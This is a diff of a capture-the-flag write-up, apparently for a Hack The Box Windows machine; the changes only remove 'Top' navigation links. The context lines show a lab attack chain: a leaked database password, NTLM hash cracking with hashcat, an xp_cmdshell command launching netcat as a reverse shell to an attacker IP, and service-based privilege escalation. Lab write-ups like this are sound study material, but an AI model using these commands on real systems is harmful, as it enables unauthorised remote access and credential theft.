@@ -61,8 +61,6 @@ msf5 run
 
 Note to self: It's always a good idea to check and recheck your services with different tools. ;)
 
-[[Top]](#top)
-
 # Explore
 
 I used the the file explorer to connect as an anonymous user.
@@ -88,8 +86,6 @@ Database=volume;
 Uid=reporting;
 Pwd=PcwTWTHRwryjc$c6
 {{< / highlight >}}
-
-[[Top]](#top)
 
 # Weaponize
 
@@ -142,8 +138,6 @@ $ ./hashcat -m 5600 ntlm-hash.txt --force
 > Password: corporate568
 {{< / highlight >}}
 
-[[Top]](#top)
-
 # Exploit
 I used the new credentials again with "impacket" to login:
 
@@ -194,8 +188,6 @@ SQL> xp_cmdshell C:\Users\mssql-svc\nc64.exe -e cmd 10.10.14.4 9001
 
 ![reverse_shell](reverse_shell.png)
 
-[[Top]](#top)
-
 # Privilege Escalation
 First, I've got the `user.txt`.
 
@@ -221,8 +213,6 @@ While doing this writeup however I realized - the password should have worked. D
 But there's more than one way to victory:
 I've seen the vulnerable service but ignored it for a hopefully quick win with the password.
 After that failed I gave it a shot.
-
-[[Top]](#top)
 
 # Root Flag
 I used "powerup.ps1" again, to exploit the "UsoSvr" service.
@@ -252,5 +242,3 @@ And this box is no exception. As far as I understand it, the service is vulnerab
 ![root_shell](root_shell.png)
 
 Mission Accomplished! :)
-
-[[Top]](#top)
